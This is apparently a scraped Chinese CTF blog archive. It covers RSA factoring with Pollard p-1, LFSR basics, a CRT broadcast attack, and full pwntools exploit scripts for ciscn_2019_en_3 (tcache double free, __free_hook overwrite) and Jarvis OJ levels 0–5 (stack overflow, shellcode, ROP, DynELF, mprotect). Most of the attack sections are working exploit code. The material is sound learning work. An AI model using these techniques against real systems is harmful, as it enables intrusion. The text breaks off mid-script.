32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 # c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 解法1 # 用yafu强行分解因数，因为数据太长，必须放入文件中来读取\n16953 :: ~\\Desktop\\Daily\\oi\\crypto » yafu \u0026#34;factor(@)\u0026#34; -batchfile .\\data.txt . . ***factors found*** PRP621 = 178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 PRP621 = 184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867 ans = 1 几秒就跑出来了，应该是程序察觉出了 n 可以用算法快速分解\n解法二 # 预期解为Pollard' p-1算法和smooth number两个知识点\n先介绍知识点\nPollard\u0026rsquo; p-1 算法 # https://blog.csdn.net/weixin_42251364/article/details/95462358\npollard’s p-1方法有点特殊，它只能应用在求整数n的一个素因子p，且p-1能被“小”因子整除的情况下，除此之外该方法无法正常应用。但是这个方法运用起来相当简单，所以在防止因式分解攻击时，必须考虑这一方法。\n考虑在一个标准的rsa中\n$n=p*q$\n设 $x\\equiv1;mod;p$\n故有 p|gcd(x-1,n)\n考虑费马小定理，有$a^{p-1}\\equiv1;mod;p$ 现在我们考虑构造一个$p-1$的倍数\n若$p-1$有多个小素因子，且每一个素数幂$q|(p-1)$，存在一个数B使$q\u0026lt;=B$ 则计算$B!$的值即为$p-1$的倍数 考虑费马小定理，则有$a^{B!}\\equiv;a^{k*(p-1)}\\equiv1;mod;p$\n$a^{B!}\\equiv;a^{k*(p-1)}\\equiv;x;mod;n$\n模除的分配律：(参考wiki模运算性质) $$ d;mod;abc\\equiv;(d;mod;a)+a*[(d/a)mod;b]+ab[(d/ a/b)];mod ;c $$\n故$x=;(a^{k*(p-1)}mod;p)+p[(x/p);mod;q]=1+k*p$\n故该$x-1$为$p$的倍数\n故计算$q=gcd(x-1),n=gcd(kp,qp)$\n得到q后可以轻松得到flag\nexp # # python2 from Crypto.Util.number import sieve_base as primes import gmpy2 n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 t=pow(2,2048) e = 0x10001 k=2 for i in range(10000): k=pow(k,primes[i],n) # 没乘方一次模一次n和最后再来模n的结果是一样的 if(k\u0026gt;t): if(i%15==0): # 随心情定每几次后判断一次 也可以乘方10000次后再判断，就怕电脑遭不住 if(gmpy2.gcd(k-1,n)!=1): # n只有q、p两个因数 print(gmpy2.gcd(k-1,n)) #178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 break p=gmpy2.gcd(k-1,n) q=n//p phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) m=hex(pow(c,d,n))[2:] print(bytes.fromhex(m).decode(\u0026#39;utf-8\u0026#39;)) #NCTF{Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3} ","date":"2 October 2020","permalink":"/achieve/2019to2021/nctf2019childrsa/","section":"archive","summary":"今天碰巧又做了一遍这个题,除了之前用yafu嗯解，又去参考了一下paper解法","title":"[NCTF2019]childRSA"},{"content":"\r简单的LFSR模型 # 这是一个 度 m=3 、拥有三个触发器的LFSR\n最左边的状态位是在反馈路径中计算得到的\n最右边的为输出位\n看做下式\ndef fun(a,b): return a^b # （a+b）% 2 while 1: output(s0) t=feedback(s1,s0) s0=s1 s1=s2 s2=t LFSR的通用形式 # 在通用形式中加入了反馈系数 $P$,它决定该反馈器是否会被启用\n若 $P$ 为 1 则反馈是活跃的 若 $P$ 为 0 则反馈是关闭的 假定LFSR的初始值为 ${S_0},{S_1}\u0026hellip;..{S_{m-1}}$\n则下一个反馈系数 $S_m$ 就计算式如下\n${S_m}={S_{m-1}}\\cdot{P_{m-1}}+{S_{m-2}}\\cdot{P_{m-2}}\u0026hellip;\u0026hellip;{S_{0}}\\cdot{P_{0}};mod;2$\n归纳得出整个序列的计算方法为\n${S_{i+m}}\\equiv\\sum_{j=0}^{m-1}P_j\\cdot{S_{i+j}};mod;2;;;S_i,P_i\\in{0,1};i=1,2\u0026hellip;.$\n序列最大长度为 $2^m-1$\n假设已知 m 和部分output 求P # 如果知道 m 的范围可以考虑爆破来做\n已知： $$ \\begin{cases} {S_m}={S_{m-1}}\\cdot{P_{m-1}}+{S_{m-2}}\\cdot{P_{m-2}}\\cdots{S_{0}}\\cdot{P_{0}};mod;2\\ {S_{m+1}}={S_{m}}\\cdot{P_{m-1}}+{S_{m-1}}\\cdot{P_{m-2}}\\cdots{S_{1}}\\cdot{P_{0}};mod;2\\ \\vdots\\ {S_{2m-1}}={S_{2m-2}}\\cdot{P_{2m-3}}+{S_{m-1}}\\cdot{P_{m-2}}\\cdots{S_{m-1}}\\cdot{P_{0}};mod;2\\ \\end{cases} $$\n建立矩阵 # $$ \\begin{pmatrix} S_0 \u0026amp; S_1 \u0026amp; S_2 \u0026amp; \\cdots \u0026amp; S_{m-1} \u0026amp; S_{m}\\ S_1 \u0026amp; S_2 \u0026amp; S_3 \u0026amp; \\cdots \u0026amp;S_{m} \u0026amp; S_{m+1}\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\nS_{m-1} \u0026amp; S_{m-2} \u0026amp; S_{m-3} \u0026amp; \\cdots \u0026amp; S_{2m-2} \u0026amp; S_{2m-1} \\end{pmatrix} $$\n做法和一般矩阵是一样的，只是把加减法换成异或了\n算出来的向量 P\n$$ \\begin{pmatrix} P_0\\ P_1\\ \\vdots\\ P_{m-1}\n\\end{pmatrix} $$\n再用 P 把原模型构造出来\n了解整个模型就可以得到整个与加密有关的序列了\n","date":"21 August 2020","permalink":"/achieve/2019to2021/lsfr%E5%AD%A6%E4%B9%A0/","section":"archive","summary":"简单的LFSR模型 # 这是一个 度 m=3 、拥有三个触发器的LFSR","title":"基础LFSR 学习"},{"content":"","date":"18 August 2020","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"\rciscn_2019_en_3 # 补充一下 double free的原理 ：堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，由于fast bin是LIFO队列的单向链表，对同一个元素free两次可以使其形成环状\n再对指针进行修改从而达到对任意地址写的效果\ntcache dup 和 double free类似，但少了很多检测 (至少该libc是这样的) 可以轻松 free两次\ntcache全名thread local caching，它为每个线程创建一个缓存,对性能提高有显著的帮助\n__malloc_hook、__realloc_hook、__free_hook、__memalign_hook 四个全局函数hook指针。简单地说，就是 malloc 调用的是 __malloc_hook 指针指向的函数，所以 jemalloc 或者 tcmalloc 通过覆盖 __malloc_hook 使程序调用到它们自定义的malloc。\n思路 # 泄露libc 利用tcache修改free hook printd_chk可以用 %p 来泄露信息也可以利用利用read后面不补0的特性，输入8个字符把字沾满，来泄露栈上数据，得到libc\nexp # from pwn import * context( log_level = \u0026#39;debug\u0026#39;) import sys \u0026#39;\u0026#39;\u0026#39; elf = ELF(\u0026#39;./ciscn_2019_en_3\u0026#39;) libc = elf.libc \u0026#39;/glibc/2.28/64/lib/ld-2.28.so\u0026#39; \u0026#39;\u0026#39;\u0026#39; _libc = \u0026#39;./libc-2.27.so\u0026#39; libc = ELF(_libc) #p = remote(\u0026#34;node3.buuoj.cn\u0026#34;,26720) from pwn import * #p = process([\u0026#39;ld-2.27.so\u0026#39;, \u0026#34;./ciscn_2019_en_3\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;:_libc}) p = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26280) def Debug(s): print(s) print(\u0026#39;pid\u0026#39;, proc.pidof(p)) pause() def s2b(s): if type(s) != type(b\u0026#39;1\u0026#39;): return bytes(s, encoding=\u0026#39;utf-8\u0026#39;) else: return s def new(size,s): p.sendlineafter(\u0026#39;choice:\u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;story:\u0026#39;,str(size)) p.sendlineafter(\u0026#39;story:\u0026#39;,s) def delete(s): p.sendlineafter(\u0026#39;choice:\u0026#39;,b\u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;index:\u0026#39;) p.sendline(s) Debug(\u0026#34;start\u0026#34;) p.recvuntil(\u0026#39;name?\u0026#39;) p.sendline(\u0026#39;%p%p%p\u0026#39;)#name p.recvuntil(\u0026#39;0x200x\u0026#39;) re = (p.recv(12)) a = int(re,16) print(\u0026#39;recv\u0026#39;,hex(a)) #0xf7260 libc_base = a-0x110081 # 用了一下午错误的libc，懒得调了。。。直接相减算偏移了。。。 print(\u0026#39;libc_base\u0026#39;,hex(libc_base)) free_hook = libc_base + libc.sym[\u0026#39;__free_hook\u0026#39;] sys_add = libc_base + libc.sym[\u0026#39;system\u0026#39;] print(\u0026#34;free_hook\u0026#34;,hex(free_hook)) print(\u0026#34;sys_add_libc\u0026#34;, hex(libc.sym[\u0026#39;system\u0026#39;])) print(\u0026#34;system:\u0026#34;,hex(sys_add)) p.sendline(\u0026#39;1234\u0026#39;) # id new(0x10,b\u0026#39;1234\u0026#39;) # 0 new(0x10,b\u0026#39;/bin/sh\\x00\u0026#39;) # 1 Debug(\u0026#39;new_heap\u0026#39;) delete(b\u0026#39;0\u0026#39;) delete(b\u0026#39;0\u0026#39;) # double free形成环 Debug(\u0026#39;free_hook--\u0026gt;debug\u0026#39;) new(0x10,p64(free_hook)) new(0x10,\u0026#39;aa\u0026#39;) new(0x10,p64(sys_add)) # 向free hook中写入system Debug(\u0026#39;del\u0026#39;) delete(b\u0026#39;1\u0026#39;) Debug(\u0026#39;sh\u0026#39;) p.interactive() \u0026#39;\u0026#39;\u0026#39; print(libc.sym[\u0026#39;read\u0026#39;]) Debug(\u0026#39;1\u0026#39;) 0x7f5224771eb3 \u0026#39;\u0026#39;\u0026#39; free hook覆盖后的情况 # 调用free hook # ","date":"18 August 2020","permalink":"/achieve/2019to2021/pwn_heap_818/","section":"archive","summary":"ciscn_2019_en_3 # 补充一下 double free的原理 ：堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，由于fast bin是LIFO队列的单向链表，对同一个元素free两次可以使其形成环状","title":"几个堆入门"},{"content":"\r记个模板题 # 题目给了以下条件：\n$$\\begin{cases} M^e \\equiv C_1 mod\\;N_1 \\\\[2ex] M^e \\equiv C_2 mod\\;N_2\\quad \\quad (e = 3) \\\\[2ex] M^e \\equiv C_3 mod\\;N_3 \\end{cases} $$\nc1 = 388825822870813587493154615238012547494666151428446904627095554917874019374474234421038941934804209410745453928513883448152675699305596595130706561989245940306390625802518940063853046813376063232724848204735684760377804361178651844505881089386 c2 = 4132099145786478580573701281040504422332184017792293421890701268012883566853254627860193724809808999005233349057847375798626123207766954266507411969802654226242300965967704040276250440511648395550180630597000941240639594 c3 = 43690392479478733802175619151519523453201200942800536494806512990350504964044289998495399805335942227586694852363272883331080188161308470522306485983861114557449204887644890409995598852299488628159224012730372865280540944897915435604154376354144428 n1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871 n2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409 n3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677 套中国剩余定理公式就可以了\nimport gmpy2 import binascii from libnum import invmod c1 = 388825822870813587493154615238012547494666151428446904627095554917874019374474234421038941934804209410745453928513883448152675699305596595130706561989245940306390625802518940063853046813376063232724848204735684760377804361178651844505881089386 c2 = 4132099145786478580573701281040504422332184017792293421890701268012883566853254627860193724809808999005233349057847375798626123207766954266507411969802654226242300965967704040276250440511648395550180630597000941240639594 c3 = 43690392479478733802175619151519523453201200942800536494806512990350504964044289998495399805335942227586694852363272883331080188161308470522306485983861114557449204887644890409995598852299488628159224012730372865280540944897915435604154376354144428 n1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871 n2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409 n3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677 _M = n1*n2*n3 m1 = _M//n1 m2 = _M//n2 m3 = _M//n3 t1 = invmod(m1, n1) t2 = invmod(m2, n2) t3 = invmod(m3, n3) _X = (c1*t1*m1 + c2*t2*m2 + c3*t3*m3) % _M a = gmpy2.iroot(_X, 3) print((gmpy2.iroot(_X, 3))) s = hex(949557364767986162692541204888383714648410089749288993554212847615599100096583727459) s = binascii.a2b_hex(s[2:-1]) print(s[::-1]) # cybrics{h3y_guY5_c0m3_t0_my_p4rtY!} 其实一般用得到的是中国剩余定理的扩展 =v=\n","date":"26 July 2020","permalink":"/achieve/2019to2021/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/","section":"archive","summary":"","title":"中国剩余定理"},{"content":"\rlevle4 # 没有libc了，要用 DynELF配合 leak 来找system的真正地址\nexp # from pwn import * io=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9880) elf=ELF(\u0026#34;./level4\u0026#34;) input_add = 0x804844B write_plt=elf.plt[\u0026#34;write\u0026#34;] read_plt=elf.plt[\u0026#34;read\u0026#34;] bss_add = 0x0804a024 #0804844B vulnerable_function def leak(add): payload = \u0026#39;a\u0026#39;*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4) io.send(payload) leak_sysadd = io.recv(4) return leak_sysadd d = DynELF(leak,elf = ELF(\u0026#34;./level4\u0026#34;)) sys_add = d.lookup(\u0026#34;system\u0026#34;,\u0026#34;libc\u0026#34;) payload2 = \u0026#39;a\u0026#39;*(0x88+4) + p32(read_plt)+p32(input_add)+p32(1)+p32(bss_add)+p32(8) io.sendline(payload2) io.sendline(\u0026#34;/bin/sh\u0026#34;) payload3 = \u0026#39;a\u0026#39;*(0x88+4) + p32(sys_add)+p32(input_add)+p32(bss_add) io.sendline(payload3) io.interactive() def leak(add): payload = \u0026#39;a\u0026#39;*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4) io.send(payload) leak_sysadd = io.recv(4) return leak_sysadd d = DynELF(leak,elf = ELF(\u0026#34;./level4\u0026#34;)) sys_add = d.lookup(\u0026#34;system\u0026#34;,\u0026#34;libc\u0026#34;) 这是利用DynELF找system的核心部分leak函数可以返回地址对应的值，让DynELF寻找到level4的地址页进而找到一系列的所需的表\n使用lookup在libc文件中搜索system函数的真实地址\nhttps://www.freebuf.com/articles/system/193646.html\npayload1= \u0026#39;a\u0026#39;*(0x88+4)+ p32(write_plt)+ p32(input_add)+ p32(1)+ p32(add)+ p32(4) \u0026gt;\u0026gt;\u0026gt; 等价执行 write(1,add,8) 并返回 input_add 进行下一次输出（下一次pwn） payload2 = \u0026#39;a\u0026#39;*(0x88+4) + p32(read_plt)+ p32(input_add)+ p32(1)+ p32(bss_add)+ p32(8) \u0026gt;\u0026gt;\u0026gt; 执行read(1,bss_add,8) 在 bss 写入 /bin/sh payload3 = \u0026#39;a\u0026#39;*(0x88+4) + p32(sys_add)+ p32(input_add)+ p32(bss_add) 执行ststem(bss_add) level5 # 按照要求尝试用mprotect来解决\n利用mproject修改.bss中内存的权限，然后将shellcode写入.bss段中执行即可\nmprotect原型\nint mprotect(const void *start, size_t len, int prot); 这里需要三个参数来使用这个函数，x64优先用寄存器传参，先找所需的 pop 指令\n只找到了 rdi rsi 没有 rdx 借用__libc_csu_init中的指令完成\nexp: # from pwn import * context.arch=\u0026#39;amd64\u0026#39; #p=process(\u0026#39;./l3\u0026#39;) \u0026#39;\u0026#39;\u0026#39; text:0000000000400690 loc_400690: ; CODE XREF: __libc_csu_init+54↓j .text:0000000000400690 mov rdx, r13 .text:0000000000400693 mov rsi, r14 .text:0000000000400696 mov edi, r15d .text:0000000000400699 call qword ptr [r12+rbx*8] .text:000000000040069D add rbx, 1 .text:00000000004006A1 cmp rbx, rbp .text:00000000004006A4 jnz short loc_400690 .text:00000000004006A6 .text:00000000004006A6 loc_4006A6: ; CODE XREF: __libc_csu_init+36↑j .text:00000000004006A6 add rsp, 8 .text:00000000004006AA pop rbx .text:00000000004006AB pop rbp .text:00000000004006AC pop r12 .text:00000000004006AE pop r13 .text:00000000004006B0 pop r14 .text:00000000004006B2 pop r15 \u0026#39;\u0026#39;\u0026#39; p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9884) libc=ELF(\u0026#39;./libc-2.19.so\u0026#39;) elf=ELF(\u0026#39;./level3_x64\u0026#39;) write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] read_plt = elf.plt[\u0026#39;read\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] bss = elf.bss() print(\u0026#39;bss=\u0026#39;,hex(bss)) input_add = 0x4005E6 rdi = 0x4006b3 rsi_r15 = 0x4006b1 gadget = 0x4006aa #确定libc的内存基址============================== p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload1 = 0x88*b\u0026#39;a\u0026#39;+p64(rdi)+p64(1)+p64(rsi_r15)+p64(read_got)+p64(1)+p64(write_plt)+p64(input_add) p.send(payload1) t=u64(p.recv(8)) print((\u0026#39;read_got\u0026#39;,hex(t))) libc.address=t-libc.symbols[\u0026#34;read\u0026#34;] #写入mproject ========================================== libc_start_main_got=elf.got[\u0026#39;__libc_start_main\u0026#39;] p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload2 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(libc_start_main_got)+p64(0)+p64(read_plt)+p64(input_add) p.send(payload2) mprotect_addr=libc.symbols[\u0026#39;mprotect\u0026#39;] print (hex(mprotect_addr)) p.send(p64(mprotect_addr)) #bss写入shellcode=================================================== p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload3 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0)+p64(read_plt)+p64(input_add) p.send(payload3) shellcode=asm(shellcraft.amd64.sh()) print (shellcode) p.send(shellcode) # bss地址写入 gmon_start中============================ p.recvuntil(\u0026#39;Input:\\n\u0026#39;) gmon_start = elf.got[\u0026#39;__gmon_start__\u0026#39;] payload4 = b\u0026#39;a\u0026#39;*(0x88)+p64(rdi)+p64(0x0)+p64(rsi_r15)+p64(gmon_start)+b\u0026#39;deadbeef\u0026#39;+p64(read_plt)+p64(input_add) p.send(payload4) p.send(p64(bss)) #修改权限并执行bss=================================================== \u0026#39;\u0026#39;\u0026#39; text:0000000000400690 loc_400690: ; CODE XREF: __libc_csu_init+54↓j .text:0000000000400690 mov rdx, r13 .text:0000000000400693 mov rsi, r14 .text:0000000000400696 mov edi, r15d .text:0000000000400699 call qword ptr [r12+rbx*8] .text:000000000040069D add rbx, 1 .text:00000000004006A1 cmp rbx, rbp .text:00000000004006A4 jnz short loc_400690 .text:00000000004006A6 .text:00000000004006A6 loc_4006A6: ; CODE XREF: __libc_csu_init+36↑j .text:00000000004006A6 add rsp, 8 .text:00000000004006AA pop rbx .text:00000000004006AB pop rbp .text:00000000004006AC pop r12 .text:00000000004006AE pop r13 .text:00000000004006B0 pop r14 .text:00000000004006B2 pop r15 \u0026#39;\u0026#39;\u0026#39; add_aa = 0x4006AA add_90 = 0x400690 p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload5 = 0x88*b\u0026#39;a\u0026#39;+p64(add_aa) + p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1000)+p64(0x600000)+p64(add_90)+p64(0)+p64(0)+p64(1)+p64(gmon_start)+p64(0)+p64(0)+p64(0)+p64(add_90) #payload=b\u0026#39;a\u0026#39;*(offset+8)+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1001)+p64(0x600000)+p64(call_addr)+b\u0026#39;deadbeef\u0026#39;+p64(0)+p64(1)+p64(gmon_start_got)+p64(0)+p64(0)+p64(0)+p64(call_addr) p.send(payload5) p.interactive() payload分析 # payload1 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(1)+ p64(rsi_r15)+ p64(write_got)+ p64(1)+ p64(write_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; write(1,write_got,0x200) payload2 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(0)+ p64(rsi_r15)+ p64(libc_start_main_got)+ p64(0)+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,libc_start_main_got,0x200) payload3 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(0)+ p64(rsi_r15)+ p64(bss)+ p64(0)+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,bss,0x200) payload4 = b\u0026#39;a\u0026#39;*(0x88)+ p64(rdi)+ p64(0x0)+ p64(rsi_r15)+ p64(gmon_start)+ b\u0026#39;deadbeef\u0026#39;+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,gmon_start,0x200) payload5 = 0x88*b\u0026#39;a\u0026#39;+ p64(add_aa) + p64(0)+ rbx p64(1)+ rbp p64(libc_start_main_got)+ r12 ---\u0026gt;called p64(7)+ r13 --\u0026gt; rdx p64(0x1000) + r14 -- \u0026gt; rsi p64(0x600000)+ r15 ---\u0026gt; edi p64(add_90)+ p64(0)+ p64(0)+ p64(1)+ p64(gmon_start)+ p64(0)+ p64(0)+ p64(0)+ p64(add_90) 还是挺绕的 。。。。。\n","date":"8 July 2020","permalink":"/achieve/2019to2021/jarvis-oj-pwn-level4to6/","section":"archive","summary":"levle4 # 没有libc了，要用 DynELF配合 leak 来找system的真正地址","title":"Jarvis_OJ_pwn_level4to6"},{"content":"\rlevel0 # x86栈溢出\nexp1 # from pwn import * #nc pwn2.jarvisoj.com 9881 io = remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9881) io.recvuntil(\u0026#34;Hello, World\\n\u0026#34;) payload = b\u0026#39;a\u0026#39;*0x88 +p64(0x0400596) io.sendline(payload) io.interactive() # CTF{713ca3944e92180e0ef03171981dcd41} level1 # x86栈溢出 + pwntools自带的x86 shellcode使用\n保护全灰,可以写shellcode了\ngdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial\nssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] printf(\u0026#34;What\u0026#39;s this:%p?\\n\u0026#34;, \u0026amp;buf); return read(0, \u0026amp;buf, 0x100u); } 这里会输出buf的地址，在buf内设置shellcode，然后覆盖堆栈将ret跳转的目标修改到buf的开头（即 set ip 到shellcode的起始点）然后执行shellcode，再进交互系统\nexp2 # from pwn import * context( arch = \u0026#39;i386\u0026#39;) # 先选相应系统 # log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./level1\u0026#39;) io = remote(\u0026#39;pwn2.jarvisoj.com\u0026#39;, 9877) shellcode = asm(shellcraft.sh()) #print(\u0026#34;shell:\\n\u0026#34;,shellcraft.sh()) # What\u0026#39;s this:0x ffb0aa80 ?\\n buf = int(io.recvline()[14: -2], 16) payload = shellcode + b\u0026#39;\\x90\u0026#39; * (0x88 + 0x4 - len(shellcode)) payload += p32(buf) #修改 ret 跳转目标 io.send(payload) io.interactive() # CTF{82c2aa534a9dede9c3a0045d0fec8617} level2 # x86栈溢出 + x86传参规律\nfrom pwn import * #设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口 r = remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;, 9878) # nc pwn2.jarvisoj.com 9878 system=0x08048320 #r.recvuntil(\u0026#39;Input:\u0026#39;) sh = 0x0804A024 payload = b\u0026#39;a\u0026#39; * (0x88+4) + p32(system)+ p32(0) +p32(sh) r.recvline(\u0026#34;Input:\u0026#34;) r.sendline(payload) r.interactive() # 0804A024 /bin/sh # 08048320 system 又由于调用函数压参数是逆序，所以将system唯一一个参数放在system的返回位置后面一个位置就ok了\nlevel2 x64 # 先用ROPgadget找程序内有没有 pop rdi 可用拿来用 (ROPgadget真是好东西)\n0x00000000004006b3 : pop rdi ; ret pop rdi 把binsh_addr传入rdi\nret 把system_addr 给 rip\n就变成了执行 system ( [rdi] )\nexp # from pwn import * system_addr=0x000000000040063E poprdi_drt=0x00000000004006b3 binsh_addr=0x0000000000600A90 p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9882) p.recvline() payload=b\u0026#39;A\u0026#39;*0x80+b\u0026#34;A\u0026#34;*8+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr) p.send(payload) p.interactive() \u0026#39;\u0026#39;\u0026#39; x64 优先使用用寄存器传参 rdi, rsi, rdx, rcx, r8, r9。当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 \u0026#34;右向左\u0026#34; 放入栈中。 CTF{081ecc7c8d658409eb43358dcc1cf446} \u0026#39;\u0026#39;\u0026#39; level3 x86 # 锁了 NX ,要泄露 libc\n之前没怎么看懂泄露 libc的操作，这两天闲着看了看算是看明白了\nfrom pwn import * io = remote(\u0026#39;pwn2.jarvisoj.com\u0026#39;,9879) write_plt=0x8048340 read = 0x804844B 